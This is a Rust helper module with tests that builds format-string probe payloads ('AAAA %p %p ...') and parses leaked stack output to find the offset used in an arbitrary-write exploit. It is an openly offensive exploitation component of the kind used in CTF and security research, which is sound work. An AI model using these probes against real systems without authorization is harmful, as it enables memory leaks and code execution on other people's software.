//! Format-string offset finder.
//!
//! Sends a probe like `AAAA%p %p %p ...` to the target via a user-supplied
//! send/recv closure and looks for the magic value `0x41414141` (or
//! `0x4141414141414141` for 64-bit) in the leaked stack.  Returns the index
//! of the `%p` whose output matches, which is the offset to use in an
//! arbitrary-write payload.
//!
//! Pure helper — no I/O of its own.

/// Build a probe string `AAAA + " %p" * count`.
pub fn build_probe(magic_word_bits: u8, count: usize) -> String {
    let header = match magic_word_bits {
        32 => "AAAA",
        64 => "AAAAAAAA",
        _  => "AAAA",
    };
    let mut s = String::with_capacity(header.len() + count * 3);
    s.push_str(header);
    for _ in 0..count { s.push_str(" %p"); }
    s
}

/// Parse a `%p`-style hex-leak response (anything that contains tokens like
/// `0x41414141`) and return the 1-based index of the leak that equals the
/// magic value, or `None` if it isn't there.
pub fn find_offset(response: &str, magic_word_bits: u8) -> Option<usize> {
    let want: u64 = match magic_word_bits {
        32 => 0x4141_4141,
        64 => 0x4141_4141_4141_4141,
        _  => 0x4141_4141,
    };
    for (i, tok) in response.split_whitespace().enumerate() {
        let t = tok.trim_start_matches("0x").trim_start_matches("0X");
        if let Ok(v) = u64::from_str_radix(t, 16) {
            if v == want { return Some(i + 1); }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test] fn probe_shape_64() {
        let p = build_probe(64, 3);
        assert_eq!(p, "AAAAAAAA %p %p %p");
    }
    #[test] fn finds_magic_x86() {
        let resp = "0xdeadbeef 0xcafebabe 0x41414141 0x12345678";
        assert_eq!(find_offset(resp, 32), Some(3));
    }
    #[test] fn no_magic() {
        assert_eq!(find_offset("0x1 0x2 0x3", 32), None);
    }
}
